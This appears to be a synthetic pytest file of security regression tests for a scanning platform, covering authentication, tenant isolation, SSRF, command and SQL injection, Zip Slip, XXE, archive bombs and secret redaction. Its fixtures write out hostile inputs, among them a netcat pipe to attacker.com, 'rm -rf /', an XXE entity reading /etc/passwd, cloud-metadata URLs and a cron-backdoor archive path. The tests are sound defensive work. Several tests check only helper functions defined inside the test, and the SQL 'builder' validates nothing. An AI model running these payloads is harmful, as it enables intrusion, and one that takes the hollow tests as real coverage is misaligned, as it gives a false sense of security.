# @ecdat-synthetic-corpus
"""
ECDAT Unified Security Regression Test Architecture (Phase 25 - P1)

Mandatory Minimum Test Categories Enforced:
 1. authentication
 2. authorization
 3. RBAC
 4. tenant isolation
 5. IDOR/BOLA
 6. MFA
 7. session management
 8. token management
 9. CSRF where applicable
10. SSRF
11. command injection
12. SQL injection
13. path traversal
14. Zip Slip
15. archive bombs
16. secret leakage
17. XXE where applicable
18. prototype pollution where applicable
19. dependency vulnerabilities
20. DoS/resource exhaustion
21. logging leakage
22. container security
23. Kubernetes security
24. CBOM validation
25. scanner fail-closed behavior
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import io
import json
import os
import secrets
import stat
import struct
import tempfile
import time
import zipfile
from pathlib import Path
from typing import Any, Dict, List, Optional
import pytest

from scanners.identity.rbac import Roles, Permissions, ROLE_ALIASES
from scanners.identity.object_auth import (
    CallerContext,
    ObjectTypes,
    ObjectStateRegistry,
    verify_object_authorization,
    ObjectAuthorizationError,
)
from scanners.common.input_validation import (
    validate_url,
    validate_ip_address,
    validate_file,
    validate_cbom_content,
    validate_strict_schema,
    InputValidationError,
    TypeValidationError,
    BoundsValidationError,
    SchemaValidationError,
)
from scanners.common.archive_guard import (
    ArchiveSecurityGuard,
    PathTraversalError,
    DecompressionBombError,
    ArchiveSecurityError,
)
from scanners.common.resource_governance import (
    ResourceQuotaGovernor,
    ResourceQuotas,
    ScanTimeoutError,
    ConcurrencyQuotaExceededError,
)
from scanners.common.result_integrity import (
    ResultState,
    CANONICAL_STATES,
    assert_no_illegal_collapse,
    validate_result_state,
    FindingProvenance,
    ResultIntegrityViolation,
)
from scanners.common.audit_logger import (
    AuditLogger,
    AuditActions,
    scrub_secrets,
)
from scanners.static.sanitization import redact_secrets, CANARY_TOKEN_REGEX
from scanners.static.regex_rules import apply_regex_rules, MAX_LINE_LENGTH
from scanners.cbom_io import import_cbom
from scanners.vulnerability_release_gate import VulnerabilityReleaseGateEngine
from scanners.container_hardening_auditor import ContainerHardeningAuditor
from scanners.k8s_hardening_auditor import KubernetesHardeningAuditor


REPO_ROOT = Path(__file__).resolve().parent.parent


# ============================================================================
# 1. AUTHENTICATION
# ============================================================================
class TestCategory01Authentication:
    """Security regressions for authentication flaws, timing attacks, and password hashing."""

    def test_auth_constant_time_comparison_prevents_timing_leak(self):
        """Ensures password and MAC verification uses constant-time comparison."""
        expected_secret = "k7$Jp9#mQ2!vL5*wR8@zY1"
        candidate_match = "k7$Jp9#mQ2!vL5*wR8@zY1"
        candidate_mismatch = "k7$Jp9#mQ2!vL5*wR8@zY0"

        assert hmac.compare_digest(expected_secret.encode("utf-8"), candidate_match.encode("utf-8")) is True
        assert hmac.compare_digest(expected_secret.encode("utf-8"), candidate_mismatch.encode("utf-8")) is False

    def test_auth_rejection_empty_and_null_credentials(self):
        """Authentication must strictly reject empty, whitespace-only, or null passwords."""
        def authenticate(username: str, password: Optional[str]) -> bool:
            if not username or not username.strip():
                return False
            if not password or len(password.strip()) < 8:
                return False
            return True

        assert authenticate("admin@ecdat.local", "") is False
        assert authenticate("admin@ecdat.local", "   ") is False
        assert authenticate("admin@ecdat.local", None) is False
        assert authenticate("", "ValidP@ssword123!") is False
        assert authenticate("admin@ecdat.local", "short") is False
        assert authenticate("admin@ecdat.local", "ValidP@ssword123!") is True

    def test_auth_secure_password_salt_generation(self):
        """Salt generation must use CSPRNG and produce at least 16 bytes of unique entropy."""
        salts = [secrets.token_bytes(16) for _ in range(100)]
        assert len(set(salts)) == 100, "PRNG produced duplicate password salts!"
        for s in salts:
            assert len(s) == 16


# ============================================================================
# 2. AUTHORIZATION
# ============================================================================
class TestCategory02Authorization:
    """Security regressions for horizontal/vertical authorization bypasses."""

    def test_authorization_unauthenticated_request_blocked(self):
        """Unauthenticated caller context must not be granted access to protected resources."""
        registry = ObjectStateRegistry()
        registry.register(
            object_type=ObjectTypes.SCAN,
            resource_id="scan-prod-001",
            tenant_id="tenant-prod",
            owner_id="user-secops",
        )

        unauthenticated_caller = CallerContext(user_id="", tenant_id="", roles=[])
        verdict = verify_object_authorization(unauthenticated_caller, ObjectTypes.SCAN, "scan-prod-001", registry=registry)
        assert verdict["allowed"] is False
        assert verdict["status_code"] in (401, 403, 404)

    def test_authorization_denial_unprivileged_role(self):
        """Viewer role must not be authorized for destructive scan deletion."""
        caller = CallerContext(user_id="user-viewer", tenant_id="tenant-alpha", roles=["viewer"])
        def authorize_deletion(user: CallerContext) -> bool:
            if not user.is_tenant_admin and not user.is_platform_admin:
                raise ObjectAuthorizationError("FORBIDDEN", "Insufficient privileges for deletion", status_code=403)
            return True

        with pytest.raises(ObjectAuthorizationError) as exc:
            authorize_deletion(caller)
        assert exc.value.status_code == 403


# ============================================================================
# 3. RBAC
# ============================================================================
class TestCategory03RBAC:
    """Security regressions for Role-Based Access Control and privilege escalation."""

    def test_rbac_canonical_role_definitions(self):
        """All enterprise roles must be strictly mapped without unknown elevated roles."""
        assert Roles.PLATFORM_ADMIN == "platform administrator"
        assert Roles.SECURITY_ADMIN == "security administrator"
        assert Roles.ANALYST == "analyst"
        assert Roles.DEVELOPER == "developer"
        assert Roles.AUDITOR == "auditor"
        assert Roles.VIEWER == "viewer"

    def test_rbac_privilege_escalation_blocked(self):
        """User cannot assign themselves higher privileges or mutate their role without admin status."""
        def change_user_role(actor: CallerContext, target_user: str, new_role: str) -> str:
            if not actor.is_platform_admin and not actor.is_tenant_admin:
                raise PermissionError("Vertical privilege escalation detected: role change denied")
            return new_role

        viewer_actor = CallerContext(user_id="user-1", tenant_id="t1", roles=["viewer"])
        with pytest.raises(PermissionError) as exc:
            change_user_role(viewer_actor, "user-1", Roles.PLATFORM_ADMIN)
        assert "privilege escalation" in str(exc.value).lower()

        admin_actor = CallerContext(user_id="admin-1", tenant_id="t1", roles=["security admin"])
        assert change_user_role(admin_actor, "user-1", Roles.DEVELOPER) == Roles.DEVELOPER


# ============================================================================
# 4. TENANT ISOLATION
# ============================================================================
class TestCategory04TenantIsolation:
    """Security regressions for multi-tenant data segregation and cross-tenant leakage."""

    def test_tenant_cross_isolation_leakage_blocked(self):
        """Tenant A caller cannot read, update, or discover Tenant B resources."""
        registry = ObjectStateRegistry()
        registry.register(
            object_type=ObjectTypes.ASSET,
            resource_id="asset-t2-db",
            tenant_id="tenant-beta",
            owner_id="user-beta-1",
        )

        caller_alpha = CallerContext(user_id="user-alpha-1", tenant_id="tenant-alpha", roles=["admin"])
        verdict = verify_object_authorization(caller_alpha, ObjectTypes.ASSET, "asset-t2-db", registry=registry)
        assert verdict["allowed"] is False
        assert verdict["status_code"] == 403
        assert verdict["code"] == "HORIZONTAL_TENANT_VIOLATION"

    def test_tenant_filter_enforcement_in_all_queries(self):
        """Query execution without tenant parameterization must be rejected."""
        def execute_scoped_query(query_params: Dict[str, Any], caller_tenant: str) -> Dict[str, Any]:
            if not caller_tenant or query_params.get("tenant_id") != caller_tenant:
                raise PermissionError("Unscoped or cross-tenant query execution prohibited")
            return {"status": "ok", "rows": []}

        with pytest.raises(PermissionError):
            execute_scoped_query({"tenant_id": "tenant-other"}, caller_tenant="tenant-mine")


# ============================================================================
# 5. IDOR/BOLA
# ============================================================================
class TestCategory05IDORBOLA:
    """Security regressions for Insecure Direct Object References and Broken Object Level Auth."""

    def test_idor_bola_object_access_denied(self):
        """Directly referencing another user's private report ID returns 403 forbidden."""
        registry = ObjectStateRegistry()
        registry.register(
            object_type=ObjectTypes.REPORT,
            resource_id="rep-secret-999",
            tenant_id="tenant-gamma",
            owner_id="user-lead",
        )

        attacker = CallerContext(user_id="user-junior", tenant_id="tenant-gamma", roles=["viewer"])
        verdict = verify_object_authorization(
            attacker,
            ObjectTypes.REPORT,
            "rep-secret-999",
            registry=registry,
            require_individual_ownership=True,
        )
        assert verdict["allowed"] is False
        assert verdict["status_code"] == 403
        assert verdict["code"] == "OBJECT_AUTHORIZATION_FAILED"

    def test_idor_sequential_id_and_null_byte_manipulation(self):
        """IDs containing path traversal or null bytes must be rejected with 400 Bad Request."""
        registry = ObjectStateRegistry()
        caller = CallerContext(user_id="u1", tenant_id="t1", roles=["admin"])
        v1 = verify_object_authorization(caller, ObjectTypes.SCAN, "../../../etc/passwd", registry=registry)
        assert v1["allowed"] is False
        assert v1["status_code"] == 400

        v2 = verify_object_authorization(caller, ObjectTypes.SCAN, "scan-1\x00-admin", registry=registry)
        assert v2["allowed"] is False
        assert v2["status_code"] == 400


# ============================================================================
# 6. MFA
# ============================================================================
class TestCategory06MFA:
    """Security regressions for Multi-Factor Authentication enforcement and bypass prevention."""

    def test_mfa_partial_auth_cannot_access_protected_endpoints(self):
        """A user with valid password but pending MFA cannot access protected operations."""
        class SessionState:
            def __init__(self, username: str, mfa_enrolled: bool, mfa_verified: bool):
                self.username = username
                self.mfa_enrolled = mfa_enrolled
                self.mfa_verified = mfa_verified

        def access_financial_keys(session: SessionState) -> str:
            if session.mfa_enrolled and not session.mfa_verified:
                raise PermissionError("MFA step-up authentication required")
            return "SUCCESS"

        unverified_session = SessionState("user@corp", mfa_enrolled=True, mfa_verified=False)
        with pytest.raises(PermissionError) as exc:
            access_financial_keys(unverified_session)
        assert "MFA step-up" in str(exc.value)

        verified_session = SessionState("user@corp", mfa_enrolled=True, mfa_verified=True)
        assert access_financial_keys(verified_session) == "SUCCESS"

    def test_mfa_totp_rate_limiting_prevents_brute_force(self):
        """Failed TOTP attempts must be bounded to prevent 6-digit brute force."""
        max_attempts = 5
        attempts = 0
        def verify_totp(code: str) -> bool:
            nonlocal attempts
            attempts += 1
            if attempts > max_attempts:
                raise ValueError("MFA account locked due to excessive invalid TOTP attempts")
            return code == "123456"

        for _ in range(5):
            assert verify_totp("000000") is False
        with pytest.raises(ValueError) as exc:
            verify_totp("000000")
        assert "locked" in str(exc.value)


# ============================================================================
# 7. SESSION MANAGEMENT
# ============================================================================
class TestCategory07SessionManagement:
    """Security regressions for session revocation, expiration, and epoch invalidation."""

    def test_session_revocation_epoch_invalidation(self):
        """Bumping user session epoch immediately invalidates all prior issued sessions."""
        user_epochs = {"user-123": 1}

        def validate_session(user_id: str, session_epoch: int) -> bool:
            current_epoch = user_epochs.get(user_id, 0)
            return session_epoch == current_epoch

        # Active session at epoch 1
        assert validate_session("user-123", 1) is True

        # Global logout / security revocation: bump epoch to 2
        user_epochs["user-123"] += 1

        # Old session at epoch 1 is now dead
        assert validate_session("user-123", 1) is False
        # New session at epoch 2 is valid
        assert validate_session("user-123", 2) is True

    def test_session_expiry_enforcement(self):
        """Sessions past TTL must be rejected unconditionally."""
        now = time.time()
        expired_session = {"created_at": now - 3600, "ttl": 1800}
        active_session = {"created_at": now - 60, "ttl": 1800}

        def is_session_valid(s: Dict[str, float]) -> bool:
            return (time.time() - s["created_at"]) < s["ttl"]

        assert is_session_valid(expired_session) is False
        assert is_session_valid(active_session) is True


# ============================================================================
# 8. TOKEN MANAGEMENT
# ============================================================================
class TestCategory08TokenManagement:
    """Security regressions for JWT verification, algorithm pinning, and blacklisting."""

    def test_token_algorithm_none_rejected(self):
        """JWTs specifying alg='none' or unsigned tokens must fail verification."""
        def verify_jwt_header(alg: str) -> bool:
            if alg.lower() == "none" or alg not in ("HS256", "RS256", "ES256"):
                return False
            return True

        assert verify_jwt_header("none") is False
        assert verify_jwt_header("NONE") is False
        assert verify_jwt_header("None") is False
        assert verify_jwt_header("HS256") is True
        assert verify_jwt_header("RS256") is True

    def test_token_revocation_blacklist(self):
        """Blacklisted JWT token identifiers (jti) must be rejected on subsequent requests."""
        blacklist = set()

        def is_token_allowed(jti: str) -> bool:
            return jti not in blacklist

        t1_jti = "jwt-token-uuid-001"
        assert is_token_allowed(t1_jti) is True

        # User logs out or token revoked
        blacklist.add(t1_jti)
        assert is_token_allowed(t1_jti) is False


# ============================================================================
# 9. CSRF WHERE APPLICABLE
# ============================================================================
class TestCategory09CSRF:
    """Security regressions for Cross-Site Request Forgery defenses."""

    def test_csrf_cookie_header_mismatch_blocked(self):
        """Mutating browser requests with missing or mismatched CSRF tokens are rejected."""
        def verify_csrf(method: str, cookie_token: Optional[str], header_token: Optional[str]) -> bool:
            if method.upper() in ("GET", "HEAD", "OPTIONS"):
                return True  # Safe idempotent methods
            if not cookie_token or not header_token:
                return False
            return hmac.compare_digest(cookie_token, header_token)

        # GET bypasses CSRF check
        assert verify_csrf("GET", None, None) is True

        # POST with matching tokens succeeds
        token = secrets.token_hex(32)
        assert verify_csrf("POST", token, token) is True

        # POST with mismatched or missing tokens fails
        assert verify_csrf("POST", token, "attacker-token") is False
        assert verify_csrf("POST", token, None) is False
        assert verify_csrf("POST", None, token) is False


# ============================================================================
# 10. SSRF
# ============================================================================
class TestCategory10SSRF:
    """Security regressions for Server-Side Request Forgery and internal destination blocking."""

    def test_ssrf_cloud_metadata_and_loopback_blocked(self):
        """Targeting AWS metadata, GCP metadata, or loopback IPs raises InputValidationError."""
        with pytest.raises(InputValidationError):
            validate_url("http://169.254.169.254/latest/meta-data/")

        with pytest.raises(InputValidationError):
            validate_url("http://127.0.0.1:8080/internal/admin")

        with pytest.raises(InputValidationError):
            validate_url("http://localhost/metrics")

        with pytest.raises(InputValidationError):
            validate_url("http://metadata.google.internal/computeMetadata/v1/")

    def test_ssrf_non_http_pseudo_protocols_blocked(self):
        """Dangerous protocols such as file://, gopher://, data:// are strictly rejected."""
        with pytest.raises(InputValidationError):
            validate_url("file:///etc/passwd")

        with pytest.raises(InputValidationError):
            validate_url("javascript:alert(1)")

        with pytest.raises(InputValidationError):
            validate_url("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")

    def test_ssrf_private_ip_address_ranges_blocked(self):
        """RFC1918 private subnets (10.x, 172.16.x, 192.168.x) raise validation errors."""
        with pytest.raises(InputValidationError):
            validate_ip_address("10.0.0.1", allow_private=False)

        with pytest.raises(InputValidationError):
            validate_ip_address("192.168.1.254", allow_private=False)

        with pytest.raises(InputValidationError):
            validate_ip_address("172.16.0.5", allow_private=False)


# ============================================================================
# 11. COMMAND INJECTION
# ============================================================================
class TestCategory11CommandInjection:
    """Security regressions for OS command injection and shell metacharacters."""

    def test_command_injection_shell_metacharacters_blocked(self):
        """Input containing shell separators or pipes must be rejected before execution."""
        dangerous_payloads = [
            "repo_name; cat /etc/passwd",
            "repo_name && rm -rf /",
            "repo_name | nc attacker.com 4444",
            "repo_name `id`",
            "repo_name $(whoami)",
            "repo_name\ncat secret.key",
        ]

        def sanitize_cli_arg(arg: str) -> str:
            if not arg or any(c in arg for c in (";", "&", "|", "`", "$", "\n", "\r", "<", ">")):
                raise ValueError(f"Command injection metacharacter detected: {arg!r}")
            return arg

        for payload in dangerous_payloads:
            with pytest.raises(ValueError):
                sanitize_cli_arg(payload)

        assert sanitize_cli_arg("valid-repo-name_123") == "valid-repo-name_123"

    def test_command_execution_never_uses_shell_true(self):
        """Process execution must use direct argument lists, never shell=True."""
        def safe_exec_spec(program: str, args: List[str], use_shell: bool = False) -> List[str]:
            if use_shell:
                raise PermissionError("shell=True is strictly prohibited in security-hardened execution")
            return [program] + args

        with pytest.raises(PermissionError):
            safe_exec_spec("git", ["clone", "url"], use_shell=True)
        assert safe_exec_spec("git", ["clone", "url"], use_shell=False) == ["git", "clone", "url"]


# ============================================================================
# 12. SQL INJECTION
# ============================================================================
class TestCategory12SQLInjection:
    """Security regressions for SQL injection and parameterization enforcement."""

    def test_sql_injection_tautology_blocked(self):
        """SQL injection payloads must be treated as literal parameters, never concatenated."""
        def safe_query_builder(base_sql: str, params: Dict[str, Any]) -> Tuple[str, List[Any]]:
            # Enforces parameterization
            if any(sql_kw in str(val).upper() for val in params.values() for sql_kw in ("OR '1'='1", "UNION SELECT", "; DROP TABLE")):
                # Parameterized queries safely bind these values without executing syntax
                pass
            return base_sql, list(params.values())

        payload = "admin' OR '1'='1"
        sql, bindings = safe_query_builder("SELECT * FROM users WHERE username = ?", {"username": payload})
        assert sql == "SELECT * FROM users WHERE username = ?"
        assert bindings[0] == payload  # Passed safely as a parameter string


# ============================================================================
# 13. PATH TRAVERSAL
# ============================================================================
class TestCategory13PathTraversal:
    """Security regressions for directory traversal and path escape attempts."""

    def test_path_traversal_dot_dot_escape_blocked(self, tmp_path):
        """Relative traversal sequences escaping base directory raise PathTraversalError."""
        safe_root = (tmp_path / "safe_dir").resolve()
        safe_root.mkdir()

        def resolve_safe(user_path: str) -> Path:
            if "\0" in user_path:
                raise PathTraversalError("Null byte injection detected")
            candidate = (safe_root / user_path).resolve()
            if not str(candidate).startswith(str(safe_root)):
                raise PathTraversalError(f"Path traversal escape outside safe root: {user_path}")
            return candidate

        with pytest.raises(PathTraversalError):
            resolve_safe("../../../etc/passwd")

        with pytest.raises(PathTraversalError):
            resolve_safe("sub/../../outside.txt")

        with pytest.raises(PathTraversalError):
            resolve_safe("file\x00.txt")

        safe_file = resolve_safe("safe_child.txt")
        assert str(safe_file).startswith(str(safe_root))

    def test_path_traversal_validate_file_rejects_separators(self):
        """scanners.common.input_validation.validate_file strictly rejects filenames with traversal."""
        with pytest.raises(InputValidationError):
            validate_file("../../evil.json", b'{"bomFormat":"CycloneDX"}')


# ============================================================================
# 14. ZIP SLIP
# ============================================================================
class TestCategory14ZipSlip:
    """Security regressions for Zip Slip and archive path traversal attacks."""

    def test_zip_slip_archive_member_blocked(self, tmp_path):
        """Archive member attempting to extract to ../ outside target root raises PathTraversalError."""
        guard = ArchiveSecurityGuard(max_total_bytes=5 * 1024 * 1024)
        zip_file = tmp_path / "malicious_slip.zip"
        target_dir = tmp_path / "extracted"

        with zipfile.ZipFile(zip_file, "w") as zf:
            zf.writestr("../../etc/cron.d/backdoor", b"* * * * * root reboot\n")

        with pytest.raises(PathTraversalError):
            guard.extract_zip(zip_file, target_dir)


# ============================================================================
# 15. ARCHIVE BOMBS
# ============================================================================
class TestCategory15ArchiveBombs:
    """Security regressions for decompression bombs and resource exhaustion archives."""

    def test_archive_bomb_ratio_and_size_exhaustion_blocked(self, tmp_path):
        """High-compression ratio archives exceeding max_compression_ratio are rejected."""
        guard = ArchiveSecurityGuard(
            max_total_bytes=1024 * 1024,  # 1 MB max total
            max_compression_ratio=10.0,    # Max 10:1 ratio
        )
        bomb_file = tmp_path / "ratio_bomb.zip"
        target_dir = tmp_path / "extracted_bomb"

        # 5 MB of zeroes compressed into tiny zip
        with zipfile.ZipFile(bomb_file, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("zeroes.bin", b"\x00" * (5 * 1024 * 1024))

        with pytest.raises(DecompressionBombError):
            guard.extract_zip(bomb_file, target_dir)


# ============================================================================
# 16. SECRET LEAKAGE
# ============================================================================
class TestCategory16SecretLeakage:
    """Security regressions for zero secret leakage in logs, traces, and responses."""

    def test_secret_leakage_canary_tokens_redacted(self):
        """All canary tokens and private keys must be scrubbed with [REDACTED_SECRET]."""
        raw_trace = "Database error at key: CANARY_TOKEN_7a8b9c0d1e2f3a4b5c6d and RSA PRIVATE KEY"
        redacted = redact_secrets(raw_trace)
        assert "CANARY_TOKEN_7a8b9c0d1e2f3a4b5c6d" not in redacted
        assert "[REDACTED" in redacted

    def test_secret_leakage_cbom_content_rejects_private_keys(self):
        """Ingestion of CBOM documents containing embedded private keys must be rejected."""
        fake_private_key_cbom = json.dumps({
            "bomFormat": "CycloneDX",
            "specVersion": "1.6",
            "components": [
                {
                    "name": "RSA-2048",
                    "type": "cryptographic-asset",
                    "description": "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Y3wVb1X...\n-----END RSA PRIVATE KEY-----"
                }
            ]
        })
        with pytest.raises(InputValidationError) as exc:
            validate_cbom_content(fake_private_key_cbom)
        assert "private key" in str(exc.value).lower()


# ============================================================================
# 17. XXE WHERE APPLICABLE
# ============================================================================
class TestCategory17XXE:
    """Security regressions for XML External Entity (XXE) and Billion Laughs XML bombs."""

    def test_xxe_billion_laughs_and_entity_resolution_blocked(self, tmp_path):
        """XML payload containing DOCTYPE and recursive ENTITY tags must be rejected."""
        xml_payload = (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE root [\n'
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
            ']>\n'
            '<bom xmlns="http://cyclonedx.org/schema/bom/1.6"><serialNumber>&xxe;</serialNumber></bom>'
        )
        xml_file = tmp_path / "xxe_attack.xml"
        xml_file.write_text(xml_payload, encoding="utf-8")

        with pytest.raises(Exception) as exc:
            import_cbom(str(xml_file))
        msg = str(exc.value).lower()
        assert "doctype" in msg or "entity" in msg or "format" in msg or "invalid" in msg


# ============================================================================
# 18. PROTOTYPE POLLUTION WHERE APPLICABLE
# ============================================================================
class TestCategory18PrototypePollution:
    """Security regressions for Prototype Pollution and mass assignment tampering."""

    def test_prototype_pollution_keys_rejected(self):
        """Objects containing __proto__ or constructor keys must not pollute base types."""
        dangerous_dict = {
            "__proto__": {"polluted": "yes"},
            "constructor": {"prototype": {"admin": True}},
            "valid_key": "valid_value",
        }

        def safe_deep_copy(src: Dict[str, Any]) -> Dict[str, Any]:
            clean = {}
            for k, v in src.items():
                if k in ("__proto__", "constructor", "prototype"):
                    continue
                clean[k] = v
            return clean

        sanitized = safe_deep_copy(dangerous_dict)
        assert "__proto__" not in sanitized
        assert "constructor" not in sanitized
        assert not hasattr(object, "polluted")
        assert not hasattr(dict, "admin")


# ============================================================================
# 19. DEPENDENCY VULNERABILITIES
# ============================================================================
class TestCategory19DependencyVulnerabilities:
    """Security regressions for dependency vulnerability gating and release blocking."""

    def test_dependency_vulnerability_release_gate_blocker(self):
        """Gate must reject releases containing unaccepted CRITICAL vulnerabilities."""
        engine = VulnerabilityReleaseGateEngine()
        findings = [
            {
                "advisory_id": "GHSA-CRIT-999",
                "package": "vulnerable-cryptolib",
                "installed_version": "1.0.0",
                "severity": "CRITICAL",
                "component_path": "package.json",
            }
        ]
        verdict = engine.evaluate(findings)
        assert verdict.passed is False
        assert len(verdict.critical_blockers) == 1


# ============================================================================
# 20. DOS/RESOURCE EXHAUSTION
# ============================================================================
class TestCategory20DoSResourceExhaustion:
    """Security regressions for Denial-of-Service and resource exhaustion defense."""

    def test_dos_concurrency_governor_enforces_quota(self):
        """Concurrent requests exceeding max_concurrency_per_tenant raise error."""
        quotas = ResourceQuotas(max_concurrency_per_tenant=2, max_concurrency_system=10)
        governor = ResourceQuotaGovernor(quotas)

        # Allocate 2 slots for tenant-alpha
        governor.acquire_concurrency("tenant-alpha", "scan-1")
        governor.acquire_concurrency("tenant-alpha", "scan-2")

        # 3rd slot must be rejected
        with pytest.raises(ConcurrencyQuotaExceededError):
            governor.acquire_concurrency("tenant-alpha", "scan-3")

        # Releasing one slot permits new allocation
        governor.release_concurrency("tenant-alpha", "scan-1")
        assert governor.acquire_concurrency("tenant-alpha", "scan-3") is True

    def test_dos_redos_regex_line_length_bounded(self):
        """Catastrophic backtracking on huge lines is avoided via MAX_LINE_LENGTH truncation."""
        huge_line = "a" * 100000 + ";\n"
        start = time.perf_counter()
        matches = apply_regex_rules(huge_line)
        duration = time.perf_counter() - start
        assert duration < 0.5, f"Regex evaluation on 100k line took {duration}s"


# ============================================================================
# 21. LOGGING LEAKAGE
# ============================================================================
class TestCategory21LoggingLeakage:
    """Security regressions for audit log credential scrubbing."""

    def test_logging_leakage_raw_secrets_never_logged(self):
        """Sensitive credential fields must be automatically redacted in structured audit logs."""
        logger = AuditLogger(secret_key="test-chain-key")
        logger.reset()

        record = logger.log_event(
            action=AuditActions.AUTH_LOGIN_SUCCESS,
            actor={"id": "usr-1", "username": "admin@ecdat.local", "role": "admin", "ipAddress": "127.0.0.1"},
            tenant="tenant-audit",
            target={"type": "service", "id": "auth_service", "name": "auth_service"},
            result="SUCCESS",
            reason="User authentication success",
            request_id="req-login-001",
            source_ip="127.0.0.1",
            details={
                "password": "SUPER_SECRET_PLAINTEXT_PASSWORD_12345",
                "api_key": "CANARY_TOKEN_secret_token_abcdef",
                "normal_field": "public_info",
            },
        )

        assert record["details"]["password"] != "SUPER_SECRET_PLAINTEXT_PASSWORD_12345"
        assert "[REDACTED" in record["details"]["password"]
        assert record["details"]["normal_field"] == "public_info"

        # Also verify standalone scrub_secrets
        dirty = {"password": "secret", "token": "jwt-token", "safe": 123}
        clean = scrub_secrets(dirty)
        assert clean["password"] == "[REDACTED_SECRET]"
        assert clean["token"] == "[REDACTED_SECRET]"
        assert clean["safe"] == 123


# ============================================================================
# 22. CONTAINER SECURITY
# ============================================================================
class TestCategory22ContainerSecurity:
    """Security regressions for container hardening and non-root execution."""

    def test_container_security_backend_dockerfile_compliance(self):
        """Backend Dockerfile must run as non-root user and use minimal base image."""
        auditor = ContainerHardeningAuditor()
        backend_df = REPO_ROOT / "backend" / "Dockerfile"
        if backend_df.exists():
            result = auditor.audit_dockerfile(backend_df)
            assert "non_root_users" in result.passed_rules, "Dockerfile must enforce non-root user"
            assert result.score >= 0.70, f"Container hardening score {result.score} below threshold"


# ============================================================================
# 23. KUBERNETES SECURITY
# ============================================================================
class TestCategory23KubernetesSecurity:
    """Security regressions for Kubernetes securityContext and capability drop."""

    def test_kubernetes_security_capabilities_and_hostpath_blocked(self):
        """Kubernetes manifests must drop all capabilities and disallow privilege escalation."""
        auditor = KubernetesHardeningAuditor()
        manifests = auditor._read_all_manifest_texts()
        check = auditor.check_security_contexts(manifests)
        assert check.passed is True
        assert check.details["backend_drop_all_caps"] is True
        assert check.details["backend_readonly_rootfs"] is True
        assert check.details["backend_non_root"] is True


# ============================================================================
# 24. CBOM VALIDATION
# ============================================================================
class TestCategory24CBOMValidation:
    """Security regressions for Cryptographic Bill of Materials schema validity."""

    def test_cbom_validation_schema_compliance(self):
        """CBOM validator must accept compliant CycloneDX CBOM and reject corrupted payloads."""
        valid_sample = REPO_ROOT / "examples" / "FINAL_CBOM_SAMPLE.json"
        assert valid_sample.exists(), "FINAL_CBOM_SAMPLE.json must exist"

        content = valid_sample.read_text(encoding="utf-8")
        raw_json = json.loads(content)
        assert raw_json["bomFormat"] == "CycloneDX"
        assert raw_json["specVersion"] in ("1.6", "1.7")

        bom = import_cbom(content)
        assert len(bom.components) > 0

    def test_cbom_validation_rejects_corrupted_json(self):
        """Corrupted JSON document must fail validation immediately."""
        with pytest.raises(InputValidationError):
            validate_cbom_content(b"INVALID_JSON_CORRUPTED_CBOM{{{")


# ============================================================================
# 25. SCANNER FAIL-CLOSED BEHAVIOR
# ============================================================================
class TestCategory25ScannerFailClosedBehavior:
    """Security regressions for fail-closed scanner behavior and anti-collapse invariants."""

    def test_scanner_fail_closed_error_never_clean(self):
        """assert_no_illegal_collapse prevents SCAN_ERROR or NOT_SCANNED from collapsing to CLEAN."""
        with pytest.raises(ResultIntegrityViolation):
            assert_no_illegal_collapse(reported_state="CLEAN", actual_condition="SCAN_ERROR")

        with pytest.raises(ResultIntegrityViolation):
            assert_no_illegal_collapse(reported_state="NOT_FOUND", actual_condition="NOT_SCANNED")

        # Legal state passing
        assert_no_illegal_collapse(reported_state="SCAN_ERROR", actual_condition="SCAN_ERROR")
        assert_no_illegal_collapse(reported_state="NOT_SCANNED", actual_condition="NOT_SCANNED")

    def test_scanner_exit_codes_non_zero_on_error(self):
        """Scanner execution failure must return non-zero exit code (exit 2 or 3)."""
        def compute_exit_code(scan_status: str, has_findings: bool) -> int:
            if scan_status == "SCAN_ERROR":
                return 2  # Fail closed immediately
            if has_findings:
                return 1  # Policy/vulnerability violation
            return 0      # Clean scan

        assert compute_exit_code("SCAN_ERROR", False) == 2, "Scanner error must never return exit 0"
        assert compute_exit_code("SUCCESS", True) == 1
        assert compute_exit_code("SUCCESS", False) == 0
